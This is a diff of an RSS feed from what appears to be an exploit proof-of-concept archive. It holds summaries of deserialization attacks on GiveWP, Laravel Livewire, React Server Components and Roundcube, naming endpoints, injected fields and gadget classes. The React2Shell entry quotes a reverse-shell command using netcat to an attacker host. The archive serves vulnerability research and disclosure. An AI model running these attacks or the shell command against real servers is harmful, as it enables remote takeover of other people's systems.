@@ -1,4 +1,344 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Deserialization on PoC Archive</title><link>https://poc.intelseclab.com/tags/deserialization/</link><description>Recent content in Deserialization on PoC Archive</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Sun, 05 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://poc.intelseclab.com/tags/deserialization/index.xml" rel="self" type="application/rss+xml"/><item><title>Apache MINA acceptMatchers Deserialization Filter Bypass to RCE (CVE-2026-42779)</title><link>https://poc.intelseclab.com/pocs/network/2026-07-05_cve-2026-42779-apache-mina-deserialization-bypass/</link><pubDate>Sun, 05 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/network/2026-07-05_cve-2026-42779-apache-mina-deserialization-bypass/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Deserialization on PoC Archive</title><link>https://poc.intelseclab.com/tags/deserialization/</link><description>Recent content in Deserialization on PoC Archive</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 06 Jul 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://poc.intelseclab.com/tags/deserialization/index.xml" rel="self" type="application/rss+xml"/><item><title>GiveWP Unauthenticated PHP Object Injection via Weak Serialized-Data Regex Check (CVE-2025-22777)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-22777-givewp-php-object-injection/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-22777-givewp-php-object-injection/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>SevDMG&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-22777&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>9.8 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>PoC&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>givewp, wordpress, wordpress-plugin, php-object-injection, deserialization, unserialize, gadget-chain, cwe-502, php, unauthenticated&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>GiveWP – Donation Plugin and Fundraising Platform (WordPress plugin, 100,000+ active installs)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>&amp;lt;= 3.19.3 (patched in 3.19.4)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>PHP (target plugin), Python (PoC/exploit tooling) on WordPress&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes (HTTP access to the donation form / &lt;code>admin-ajax.php&lt;/code> endpoint)&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>CVE-2025-22777 is an unauthenticated PHP Object Injection (CWE-502, Deserialization of Untrusted Data) vulnerability in the GiveWP WordPress donation plugin. GiveWP stores certain donor-supplied form field values as serialized PHP meta in the database and runs a regex check meant to confirm the value &amp;ldquo;looks like&amp;rdquo; a safe serialized string before it is later passed to PHP&amp;rsquo;s &lt;code>unserialize()&lt;/code>; that regex check is weak and can be defeated by padding the payload with junk/gibberish characters, letting a crafted serialized object slip through and get deserialized. If a suitable gadget chain (a class with an exploitable magic method such as &lt;code>__destruct()&lt;/code>/&lt;code>__wakeup()&lt;/code>) is reachable in GiveWP or a co-installed plugin/theme, this results in arbitrary PHP object instantiation and potentially remote code execution, arbitrary file write/deletion, or other high-impact side effects — with no authentication required. This mirrored repository is an independent researcher&amp;rsquo;s work-in-progress PoC that builds a serialized &amp;ldquo;gadget&amp;rdquo; object (a &lt;code>FinalGadget&lt;/code>/&lt;code>ChainGadget&lt;/code> class chain targeting a &lt;code>filename&lt;/code> property, injected via the donation form&amp;rsquo;s &lt;code>give_company&lt;/code> field to &lt;code>admin-ajax.php?action=give_process_donation&lt;/code>), but the actual HTTP exploit driver (&lt;code>exploit_cve2025-22777.py&lt;/code>) ships with an empty &lt;code>payload = {}&lt;/code> and no request is ever sent, and the more developed &lt;code>exploit_struct.py&lt;/code> script&amp;rsquo;s &lt;code>exploit()&lt;/code> function is truncated before it issues any HTTP request. As shipped, neither script performs a working end-to-end attack.&lt;/p></description></item><item><title>Laravel Livewire Remote Code Execution via Known APP_KEY (CVE-2025-54068)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-54068-livewire-appkey-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-54068-livewire-appkey-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>haxorstars (recode of original research by Synacktiv / Livepyre)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-54068&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>9.8 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>Weaponized&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>laravel, livewire, php, deserialization, app-key, hmac-forgery, gadget-chain, rce, cwe-502, python&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Laravel Livewire (versions prior to v3.6.4)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>Livewire &amp;lt; v3.6.4 (per repository&amp;rsquo;s bundled &lt;code>versions.json&lt;/code> version-hash fingerprinting)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Python 3 exploit client targeting a PHP/Laravel + Livewire web application&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No application session required, but the attacker must know (or have leaked/brute-forced) the target&amp;rsquo;s Laravel &lt;code>APP_KEY&lt;/code>&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>Laravel Livewire serializes component state into a &lt;code>wire:snapshot&lt;/code> HTML attribute and protects it with an HMAC-SHA256 checksum keyed on the application&amp;rsquo;s &lt;code>APP_KEY&lt;/code>. If an attacker obtains the &lt;code>APP_KEY&lt;/code> (leaked &lt;code>.env&lt;/code>, default/demo key, weak secret, etc.), they can craft an arbitrary snapshot payload, sign it with a correctly computed checksum, and submit it to Livewire&amp;rsquo;s component-update endpoint. Because Livewire trusts any snapshot whose checksum matches, a forged snapshot containing nested serialized PHP objects (&lt;code>Illuminate\Broadcasting\BroadcastEvent&lt;/code>, &lt;code>Illuminate\Validation\Validator&lt;/code>, &lt;code>Laravel\SerializableClosure\Serializers\Signed&lt;/code>, &lt;code>GuzzleHttp\Psr7\FnStream&lt;/code>, etc.) reaches a PHP-object-injection gadget chain that invokes an arbitrary PHP function (e.g. &lt;code>system&lt;/code>, &lt;code>shell_exec&lt;/code>, or &lt;code>unserialize&lt;/code> of a further attacker-supplied payload) with attacker-controlled arguments, yielding remote code execution. This repository (a Python recode of Synacktiv&amp;rsquo;s original &amp;ldquo;Livepyre&amp;rdquo; PoC) automates the whole chain: locating the Livewire snapshot and CSRF token on a page, rebuilding a malicious snapshot with the injected gadget, HMAC-signing it using the supplied &lt;code>APP_KEY&lt;/code>, and POSTing it to the discovered Livewire update URI.&lt;/p></description></item><item><title>React Server Components Flight-Protocol Prototype Pollution RCE — "React2Shell" (CVE-2025-55182)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-55182-react-server-components-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-55182-react-server-components-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>Herick-Costa&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-55182&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>10.0 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>PoC&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>react, react-server-components, rsc, flight-protocol, prototype-pollution, deserialization, unauthenticated-rce, nextjs, nodejs, python&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>React Server Components (RSC) packages using the Flight protocol (commonly deployed via Next.js)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>React 19.0, 19.1.0, 19.1.1, 19.2.0 (per source repository)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Python (exploit client) targeting Node.js server running React Server Components&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>No&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes — single crafted HTTP request over the network&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>CVE-2025-55182, dubbed &amp;ldquo;React2Shell&amp;rdquo;, is a critical unauthenticated remote code execution vulnerability in React Server Components&amp;rsquo; Flight protocol deserialization. The Flight protocol serializes/deserializes component data exchanged between client and server; insufficient validation during deserialization allows a specially crafted &lt;code>multipart/form-data&lt;/code> payload to manipulate internal object structures, walk the JavaScript prototype chain, reach the &lt;code>Function&lt;/code>/&lt;code>constructor&lt;/code> machinery, and ultimately invoke &lt;code>child_process.execSync&lt;/code> server-side. The included PoC is a 22-line, 715-byte Python script that builds this Flight payload and POSTs it to a target RSC endpoint, causing the server to execute an attacker-supplied reverse-shell command (&lt;code>busybox nc &amp;lt;LHOST&amp;gt; 4444 -e sh&lt;/code>) with no authentication and a single HTTP request.&lt;/p></description></item><item><title>Roundcube Webmail Post-Auth RCE via PHP Object Deserialization (CVE-2025-49113)</title><link>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-49113-roundcube-php-object-deserialization-rce/</link><pubDate>Mon, 06 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/web/2026-07-06_cve-2025-49113-roundcube-php-object-deserialization-rce/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Date Added&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Last Updated&lt;/strong>&lt;/td>
+ &lt;td>2026-07-06&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Author / Researcher&lt;/strong>&lt;/td>
+ &lt;td>rippsec&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVE / Advisory&lt;/strong>&lt;/td>
+ &lt;td>CVE-2025-49113&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Category&lt;/strong>&lt;/td>
+ &lt;td>web&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Severity&lt;/strong>&lt;/td>
+ &lt;td>Critical&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>CVSS Score&lt;/strong>&lt;/td>
+ &lt;td>9.9 (per NVD)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Status&lt;/strong>&lt;/td>
+ &lt;td>Weaponized&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Tags&lt;/strong>&lt;/td>
+ &lt;td>roundcube, webmail, php, deserialization, object-injection, gadget-chain, rce, post-auth, cwe-502&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Related&lt;/strong>&lt;/td>
+ &lt;td>N/A&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="affected-target">Affected Target&lt;/h2>
+&lt;table>
+ &lt;thead>
+ &lt;tr>
+ &lt;th>Field&lt;/th>
+ &lt;th>Value&lt;/th>
+ &lt;/tr>
+ &lt;/thead>
+ &lt;tbody>
+ &lt;tr>
+ &lt;td>&lt;strong>Software / System&lt;/strong>&lt;/td>
+ &lt;td>Roundcube Webmail&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Versions Affected&lt;/strong>&lt;/td>
+ &lt;td>≤ 1.6.10&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Language / Platform&lt;/strong>&lt;/td>
+ &lt;td>Python 3 (stdlib only) PoC targeting a PHP web application&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Authentication Required&lt;/strong>&lt;/td>
+ &lt;td>Yes (any valid Roundcube user account)&lt;/td>
+ &lt;/tr>
+ &lt;tr>
+ &lt;td>&lt;strong>Network Access Required&lt;/strong>&lt;/td>
+ &lt;td>Yes (HTTP/HTTPS to the Roundcube instance)&lt;/td>
+ &lt;/tr>
+ &lt;/tbody>
+&lt;/table>
+&lt;hr>
+&lt;h2 id="summary">Summary&lt;/h2>
+&lt;p>Roundcube Webmail versions up to and including 1.6.10 are vulnerable to a post-authentication PHP object deserialization vulnerability in the file upload handler, which passes a client-supplied attachment filename through a deserialization path without validation. The root cause is that the &lt;code>Crypt_GPG_Engine&lt;/code> class (present in Roundcube&amp;rsquo;s dependency chain) acts as a usable gadget chain: its &lt;code>_gpgconf&lt;/code> property is invoked in a system-level call during object handling. An authenticated attacker can craft a serialized &lt;code>Crypt_GPG_Engine&lt;/code> object as the filename of an uploaded attachment, causing the server to instantiate it and execute an attacker-controlled OS command as the webserver user. The included Python PoC logs into Roundcube, then uploads a multipart file whose filename field contains the malicious serialized payload (with the command Base32-encoded to survive the filename field&amp;rsquo;s character restrictions), achieving full remote command execution.&lt;/p></description></item><item><title>Apache MINA acceptMatchers Deserialization Filter Bypass to RCE (CVE-2026-42779)</title><link>https://poc.intelseclab.com/pocs/network/2026-07-05_cve-2026-42779-apache-mina-deserialization-bypass/</link><pubDate>Sun, 05 Jul 2026 00:00:00 +0000</pubDate><guid>https://poc.intelseclab.com/pocs/network/2026-07-05_cve-2026-42779-apache-mina-deserialization-bypass/</guid><description>&lt;h2 id="metadata">Metadata&lt;/h2>
 &lt;table>
  &lt;thead>
  &lt;tr>
